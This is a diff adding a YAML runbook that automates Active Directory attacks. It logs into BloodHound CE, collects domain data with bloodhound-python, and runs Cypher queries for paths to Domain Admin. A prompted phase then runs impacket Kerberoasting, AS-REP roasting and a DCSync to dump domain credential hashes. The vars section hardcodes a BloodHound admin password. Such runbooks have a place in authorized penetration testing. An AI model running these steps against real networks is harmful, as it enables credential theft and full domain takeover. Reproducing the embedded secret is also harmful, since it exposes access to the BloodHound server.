@@ -1,0 +1,246 @@
+# v2 runbook — BloodHound AD exploitation
+name: "BloodHound AD Exploitation"
+description: "BloodHound CE integration: SharpHound data collection, Cypher query automation, privilege escalation path analysis, and attack path execution using BloodHound CE API"
+version: "2.0"
+
+vars:
+  bh_url: "http://192.168.56.1:8989"
+  bh_user: "admin"
+  bh_pass: "_7H3SgoBmURpueZo7uJZagXAZ42mkf17"
+  domain: ""
+  dc_ip: ""
+  target_user: ""
+  target_pass: ""
+  target_hash: ""
+
+steps:
+  - id: preamble
+    type: log
+    message: "BloodHound AD exploitation — {domain} via {bh_url} (case: {case_id})"
+
+  # Phase 1: BloodHound CE authentication
+  - id: auth
+    name: "BloodHound CE authentication"
+    type: sequential
+    steps:
+      - id: bh_login
+        name: "Authenticate to BloodHound CE API"
+        tool: python3
+        args: ["-c",
+               "\"import requests,json;\nurl='{bh_url}';\nr=requests.post(url+'/api/v2/login',json={'username':'{bh_user}','password':'{bh_pass}'});\ntoken_data=r.json();\njson.dump(token_data,open('{case_dir}/bh_auth.json','w'),indent=2);\ntoken=token_data.get('access_token','') or token_data.get('token','');\nopen('{case_dir}/bh_token.txt','w').write(token);\nprint(f'Authenticated: status={r.status_code}')\"",
+               "-o", "{case_dir}/bh_auth_result.txt"]
+        timeout: 30
+        artifacts: ["{case_dir}/bh_token.txt"]
+
+      - id: bh_whoami
+        name: "Verify authentication"
+        tool: python3
+        args: ["-c",
+               "\"import requests,json;\ntoken=open('{case_dir}/bh_token.txt').read().strip();\nheaders={'Authorization':f'Bearer {token}'};\nr=requests.get('{bh_url}/api/v2/user/me',headers=headers);\njson.dump(r.json(),open('{case_dir}/bh_whoami.json','w'),indent=2);\nprint(f'User: {r.json().get(\\\"username\\\",\\\"?\\\")}')\"",
+               "-o", "{case_dir}/bh_whoami_result.txt"]
+        timeout: 15
+
+  # Phase 2: BloodHound CE — Search & query
+  - id: search
+    name: "BloodHound CE search & explore"
+    type: parallel
+    max_workers: 4
+    steps:
+      - id: bh_search_users
+        name: "Search user nodes"
+        tool: python3
+        args: ["-c",
+               "\"import requests,json;\ntoken=open('{case_dir}/bh_token.txt').read().strip();\nheaders={'Authorization':f'Bearer {token}','Content-Type':'application/json'};\nr=requests.post('{bh_url}/api/v2/graphs/list',json={'type':'user'},headers=headers);\njson.dump(r.json(),open('{case_dir}/bh_users.json','w'),indent=2);\nusers=r.json().get('data',[]);\nprint(f'Users: {len(users)}');\nfor u in users[:50]: print(f'  {u.get(\\\"ObjectId\\\",\\\"?\\\").split(\\\"-\\\")[0] if \\\"-\\\" in u.get(\\\"ObjectId\\\",\\\"\\\") else \\\"?\\\"}: {u.get(\\\"label\\\",\\\"?\\\")}')\"",
+               "-o", "{case_dir}/bh_users_list.txt"]
+        timeout: 30
+        artifacts: ["{case_dir}/bh_users.json"]
+
+      - id: bh_search_computers
+        name: "Search computer nodes"
+        tool: python3
+        args: ["-c",
+               "\"import requests,json;\ntoken=open('{case_dir}/bh_token.txt').read().strip();\nheaders={'Authorization':f'Bearer {token}','Content-Type':'application/json'};\nr=requests.post('{bh_url}/api/v2/graphs/list',json={'type':'computer'},headers=headers);\njson.dump(r.json(),open('{case_dir}/bh_computers.json','w'),indent=2);\ncomps=r.json().get('data',[]);\nprint(f'Computers: {len(comps)}');\nfor c in comps[:50]: print(f'  {c.get(\\\"label\\\",\\\"?\\\")}')\"",
+               "-o", "{case_dir}/bh_computers_list.txt"]
+        timeout: 30
+
+      - id: bh_search_groups
+        name: "Search group nodes"
+        tool: python3
+        args: ["-c",
+               "\"import requests,json;\ntoken=open('{case_dir}/bh_token.txt').read().strip();\nheaders={'Authorization':f'Bearer {token}','Content-Type':'application/json'};\nr=requests.post('{bh_url}/api/v2/graphs/list',json={'type':'group'},headers=headers);\njson.dump(r.json(),open('{case_dir}/bh_groups.json','w'),indent=2);\ngroups=r.json().get('data',[]);\nprint(f'Groups: {len(groups)}');\nfor g in groups[:50]: print(f'  {g.get(\\\"label\\\",\\\"?\\\")}')\"",
+               "-o", "{case_dir}/bh_groups_list.txt"]
+        timeout: 30
+
+  # Phase 3: BloodHound CE — Cypher queries
+  - id: cypher
+    name: "Cypher query execution"
+    type: sequential
+    steps:
+      - id: cypher_exec
+        name: "Execute Cypher queries against BH CE"
+        tool: python3
+        args: ["-c",
+               "\"import requests,json,time;\ntoken=open('{case_dir}/bh_token.txt').read().strip();\nheaders={'Authorization':f'Bearer {token}','Content-Type':'application/json'};\nqueries={\n 'domain_admins': 'MATCH p=(g:Group)-[r:MemberOf*1..]->(g2:Group {name:\\\"DOMAIN ADMINS@' + '{domain}' + '.local\\\"}) RETURN p',\n 'computers_with_admins': 'MATCH (c:Computer)<-[:AdminTo]-(u:User) RETURN c.name,u.name',\n 'kerberoastable': 'MATCH (u:User {hasspn:true}) RETURN u.name,u.samaccountname',\n 'asrep_roastable': 'MATCH (u:User {dontreqpreauth:true}) RETURN u.name,u.samaccountname',\n 'highvalue_sessions': 'MATCH (u:User)-[:HasSession]->(c:Computer) WHERE u.highvalue=true RETURN u.name,c.name',\n 'constrained_delegation': 'MATCH (c:Computer)-[:AllowedToDelegate]->(o) RETURN c.name,o.name',\n 'unconstrained_delegation': 'MATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name',\n 'admin_count': 'MATCH (u:User {admincount:true}) RETURN u.name,u.samaccountname',\n 'gpo_abuse': 'MATCH p=(g:Group)-[r:Contains*1..]->(c:Computer) WHERE g.objectid STARTS WITH \\\"S-1-5-21\\\" AND c.highvalue=true RETURN p LIMIT 20',\n 'shortest_path_da': 'MATCH (n {name:\\\"{target_user}@{domain}.local\\\"}), (g:Group {name:\\\"DOMAIN ADMINS@{domain}.local\\\"}), p=shortestPath((n)-[:MemberOf|HasSession|AdminTo|AllExtendedRights|AddMember|ForceChangePassword|GenericAll|GenericWrite|Owns|WriteDacl|WriteOwner|CanRDP|ExecuteDCOM|AllowedToDelegate|ReadLAPSPassword|Contains|GpLink|AllowedToAct|SQLAdmin|AddAllowedToAct|WriteSPN|AddKeyCredentialLink*1..]->(g)) RETURN p'\n};\nfor name,q in queries.items():\n try:\n  r=requests.post('{bh_url}/api/v2/graphs/cypher',json={'query':q.replace('{domain}','{domain}').replace('{target_user}','{target_user}')},headers=headers,timeout=60);\n  data=r.json();\n  json.dump(data,open(f'{case_dir}/cypher_{name}.json','w'),indent=2);\n  count=len(data.get('data',[]));\n  print(f'{name}: {count} results');\n except Exception as e:\n  print(f'{name}: ERROR - {e}')\n  time.sleep(1)\n\"",
+               "-o", "{case_dir}/cypher_results_summary.txt"]
+        timeout: 120
+        artifacts:
+          - "{case_dir}/cypher_domain_admins.json"
+          - "{case_dir}/cypher_kerberoastable.json"
+          - "{case_dir}/cypher_asrep_roastable.json"
+          - "{case_dir}/cypher_shortest_path_da.json"
+
+  # Phase 4: SharpHound data collection
+  - id: sh_download
+    name: "SharpHound collection"
+    type: sequential
+    steps:
+      - id: sh_check
+        name: "Check SharpHound availability"
+        tool: bash
+        args: ["-c",
+               "which bloodhound-python 2>/dev/null && echo 'bloodhound-python found' || echo 'bloodhound-python not found'; which bloodhound.py 2>/dev/null && echo 'bloodhound.py found' || echo 'bloodhound.py not found'; python3 -c 'import bloodhound; print(\"bloodhound module found\")' 2>/dev/null || echo 'bloodhound module not found'",
+               "-o", "{case_dir}/sh_availability.txt"]
+        timeout: 15
+
+      - id: sh_collect
+        name: "Run BloodHound.py collector"
+        tool: bloodhound-python
+        args: ["-d", "{domain}",
+               "-u", "{target_user}",
+               "-p", "{target_pass}",
+               "-dc", "{dc_ip}",
+               "-c", "All",
+               "--zip",
+               "--outputdir", "{case_dir}/bloodhound_data/",
+               "-o", "{case_dir}/bloodhound_collection.log"]
+        timeout: 300
+        artifacts: ["{case_dir}/bloodhound_data/"]
+
+      - id: sh_upload
+        name: "Upload collected data to BH CE"
+        tool: python3
+        args: ["-c",
+               "\"import requests,json,glob;\ntoken=open('{case_dir}/bh_token.txt').read().strip();\nheaders={'Authorization':f'Bearer {token}'};\nzip_files=glob.glob('{case_dir}/bloodhound_data/*.zip');\nfor zf in zip_files:\n with open(zf,'rb') as f:\n  r=requests.post('{bh_url}/api/v2/data-ingestion/upload',files={'file':f},headers=headers);\n  print(f'Uploaded {zf}: {r.status_code}')\nif not zip_files:\n print('No zip files found in bloodhound_data/')\n\"",
+               "-o", "{case_dir}/sh_upload_result.txt"]
+        timeout: 60
+
+  # Phase 5: BloodHound CE — Attack path analysis
+  - id: attack_paths
+    name: "Attack path analysis"
+    type: parallel
+    max_workers: 4
+    steps:
+      - id: ap_highvalue
+        name: "Find high-value targets"
+        tool: python3
+        args: ["-c",
+               "\"import json;\ntry:\n d=json.load(open('{case_dir}/bh_groups.json'));\n high=[g for g in d.get('data',[]) if 'ADMIN' in str(g).upper() or 'OPERATOR' in str(g).upper()];\n print(f'High-value groups: {len(high)}');\n [print(f'  {g.get(\\\"label\\\",\\\"?\\\")}') for g in high[:30]]\nexcept: print('No group data available')\"",
+               "-o", "{case_dir}/attack_highvalue_targets.txt"]
+        timeout: 15
+
+      - id: ap_shortest
+        name: "Shortest path to Domain Admin"
+        tool: python3
+        args: ["-c",
+               "\"import json;\ncypher_file='{case_dir}/cypher_shortest_path_da.json';\ntry:\n d=json.load(open(cypher_file));\n paths=d.get('data',[]);\n print(f'Attack paths to DA: {len(paths)}');\n for i,p in enumerate(paths[:10]):\n  print(f'\\nPath {i+1}:');\n  nodes=p.get('graph',{}).get('nodes',[]);\n  edges=[e for e in p.get('graph',{}).get('edges',[]) if e.get('type') in ('MemberOf','AdminTo','HasSession','AllExtendedRights','ForceChangePassword','AddMember','GenericAll','GenericWrite')];\n  print(f'  Nodes: {len(nodes)}, Key edges: {len(edges)}');\n  for n in nodes[:10]:\n   print(f'    -> {n.get(\\\"label\\\",\\\"?\\\")}');\nexcept: print('No path data - BH CE may need data ingestion first')\"",
+               "-o", "{case_dir}/attack_shortest_paths.txt"]
+        timeout: 15
+        artifacts: ["{case_dir}/attack_shortest_paths.txt"]
+
+      - id: ap_kerberoast
+        name: "Kerberoastable accounts"
+        tool: python3
+        args: ["-c",
+               "\"import json;\ncypher_file='{case_dir}/cypher_kerberoastable.json';\ntry:\n d=json.load(open(cypher_file));\n kerb_users=d.get('data',[]);\n print(f'Kerberoastable users: {len(kerb_users)}');\n for u in kerb_users:\n  print(f'  {u.get(\\\"name\\\",\\\"?\\\")} ({u.get(\\\"samaccountname\\\",\\\"?\\\")})')\nexcept: print('No kerberoast data available')\"",
+               "-o", "{case_dir}/attack_kerberoast.txt"]
+        timeout: 15
+
+      - id: ap_asrep
+        name: "AS-REP roastable accounts"
+        tool: python3
+        args: ["-c",
+               "\"import json;\ncypher_file='{case_dir}/cypher_asrep_roastable.json';\ntry:\n d=json.load(open(cypher_file));\n asrep_users=d.get('data',[]);\n print(f'AS-REP roastable users: {len(asrep_users)}');\n for u in asrep_users:\n  print(f'  {u.get(\\\"name\\\",\\\"?\\\")} ({u.get(\\\"samaccountname\\\",\\\"?\\\")})')\nexcept: print('No AS-REP data available')\"",
+               "-o", "{case_dir}/attack_asrep.txt"]
+        timeout: 15
+
+  # Phase 6: Action — Exploit paths
+  - id: ask_exploit
+    type: prompt
+    message: "Execute discovered attack paths? (requires impacket + domain creds)"
+    then:
+      - id: exploit_kerberoast
+        name: "Kerberoast TGS-REP crack"
+        tool: impacket-GetUserSPNs
+        args: ["-request",
+               "-dc-ip", "{dc_ip}",
+               "{domain}/{target_user}:{target_pass}",
+               "-outputfile", "{case_dir}/kerberoast_tgs.txt",
+               "-o", "{case_dir}/kerberoast_result.txt"]
+        timeout: 60
+
+      - id: exploit_asrep
+        name: "AS-REP roast"
+        tool: impacket-GetNPUsers
+        args: ["-request",
+               "-dc-ip", "{dc_ip}",
+               "{domain}/",
+               "-usersfile", "{case_dir}/asrep_users.txt",
+               "-format", "hashcat",
+               "-outputfile", "{case_dir}/asrep_hashes.txt",
+               "-o", "{case_dir}/asrep_result.txt"]
+        timeout: 60
+
+      - id: exploit_dcsync
+        name: "DCSync (if DA)"
+        tool: impacket-secretsdump
+        args: ["-just-dc",
+               "-dc-ip", "{dc_ip}",
+               "{domain}/{target_user}:{target_pass}",
+               "-outputfile", "{case_dir}/dcsync_hashes.txt",
+               "-o", "{case_dir}/dcsync_result.txt"]
+        timeout: 120
+
+  # Phase 7: BloodHound CE — Custom queries library
+  - id: queries_lib
+    name: "Useful Cypher queries library"
+    type: sequential
+    steps:
+      - id: cypher_library
+        name: "Save useful Cypher queries"
+        tool: python3
+        args: ["-c",
+               "\"queries='''# === BloodHound CE Cypher Query Library ===\n\n# 1. Find all Domain Admins\nMATCH (g:Group) WHERE g.name =~ \\\"(?i).*DOMAIN ADMINS.*\\\" RETURN g\n\n# 2. Users with path to Domain Admin\nMATCH (u:User), (g:Group {name:\\\"DOMAIN ADMINS@{domain}.local\\\"}), p=shortestPath((u)-[:MemberOf|HasSession|AdminTo*1..]->(g)) RETURN p\n\n# 3. Kerberoastable users\nMATCH (u:User {hasspn:true}) RETURN u.name, u.samaccountname, u.serviceprincipalnames\n\n# 4. AS-REP roastable users\nMATCH (u:User {dontreqpreauth:true}) RETURN u.name, u.samaccountname\n\n# 5. Computers with unconstrained delegation\nMATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name\n\n# 6. All active user sessions\nMATCH (u:User)-[:HasSession]->(c:Computer) RETURN u.name, c.name\n\n# 7. GPO abuse paths\nMATCH p=(:GPO)-[:GpLink]->(:OU)-[:Contains]->(c:Computer) RETURN p LIMIT 50\n\n# 8. ACL abuse: ForceChangePassword\nMATCH (u:User)-[r:ForceChangePassword]->(target:User) RETURN u.name, type(r), target.name\n\n# 9. ACL abuse: GenericAll\nMATCH (n)-[r:GenericAll]->(target) RETURN n.name, type(r), target.name, labels(target)\n\n# 10. ACL abuse: AddMember to privileged group\nMATCH (n:User)-[r:AddMember]->(g:Group) WHERE g.name =~ \\\"(?i).*ADMIN.*\\\" RETURN n.name, g.name\n\n# 11. Computers with LAPS\nMATCH (c:Computer {haslaps:true}) RETURN c.name\n\n# 12. Outbound trust relationships\nMATCH (d:Domain)-[:TrustedBy]->(d2:Domain) RETURN d.name, d2.name, d2.trusttype\n\n# 13. User with highest session count\nMATCH (u:User)-[:HasSession]->(c:Computer) RETURN u.name, count(c) AS sessions ORDER BY sessions DESC\n\n# 14. Constrained delegation abuse\nMATCH (c:Computer)-[:AllowedToDelegate]->(o) RETURN c.name, o.name\n\n# 15. Find paths from a specific user\nMATCH (n {name:\\\"USER@{domain}.local\\\"}), (g:Group {name:\\\"DOMAIN ADMINS@{domain}.local\\\"}), p=shortestPath((n)-[:MemberOf|HasSession|AdminTo|AllExtendedRights|AddMember|ForceChangePassword|GenericAll|GenericWrite|Owns|WriteDacl|WriteOwner|CanRDP|ExecuteDCOM|AllowedToDelegate|ReadLAPSPassword|Contains|GpLink|AllowedToAct|SQLAdmin|AddAllowedToAct|WriteSPN|AddKeyCredentialLink*1..]->(g)) RETURN p\n'''\nopen('{case_dir}/cypher_query_library.txt','w').write(queries);\nprint('Cypher query library written')\n\"",
+               "-o", "{case_dir}/cypher_library_gen.txt"]
+        timeout: 15
+        artifacts: ["{case_dir}/cypher_query_library.txt"]
+
+  # Phase 8: Report
+  - id: report
+    name: "Generate BloodHound AD report"
+    type: report
+    format: markdown
+    title: "BloodHound AD Exploitation — {domain}"
+    output: "{case_dir}/bloodhound-ad-report.md"
+    sections:
+      - heading: "Target"
+        body: "- Domain: {domain}\n- DC: {dc_ip}\n- BH CE: {bh_url}\n- Case: {case_id}"
+      - heading: "BloodHound CE Connectivity"
+        body: "- Auth: {case_dir}/bh_auth_result.txt\n- User: {case_dir}/bh_whoami_result.txt"
+      - heading: "Domain Overview"
+        body: "- Users: {case_dir}/bh_users_list.txt\n- Computers: {case_dir}/bh_computers_list.txt\n- Groups: {case_dir}/bh_groups_list.txt"
+      - heading: "Cypher Query Results"
+        body: "- Domain Admins: {case_dir}/cypher_domain_admins.json\n- Kerberoastable: {case_dir}/cypher_kerberoastable.json\n- AS-REP: {case_dir}/cypher_asrep_roastable.json\n- Sessions: {case_dir}/cypher_highvalue_sessions.json\n- Delegation: {case_dir}/cypher_constrained_delegation.json\n- Shortest path: {case_dir}/cypher_shortest_path_da.json"
+      - heading: "Attack Paths"
+        body: "- High-value targets: {case_dir}/attack_highvalue_targets.txt\n- Shortest paths: {case_dir}/attack_shortest_paths.txt\n- Kerberoast: {case_dir}/attack_kerberoast.txt\n- AS-REP: {case_dir}/attack_asrep.txt"
+      - heading: "Data Collection"
+        body: "- BloodHound.py: {case_dir}/bloodhound_collection.log\n- Upload: {case_dir}/sh_upload_result.txt"
+      - heading: "Exploitation"
+        body: "- Kerberoast TGS: {case_dir}/kerberoast_result.txt\n- AS-REP hashes: {case_dir}/asrep_result.txt\n- DCSync: {case_dir}/dcsync_result.txt"
+      - heading: "Query Library"
+        body: "- Cypher queries: {case_dir}/cypher_query_library.txt"
+
+postflight:
+  - id: done
+    type: notify
+    level: success
+    message: "BloodHound AD exploitation complete — {case_dir}"
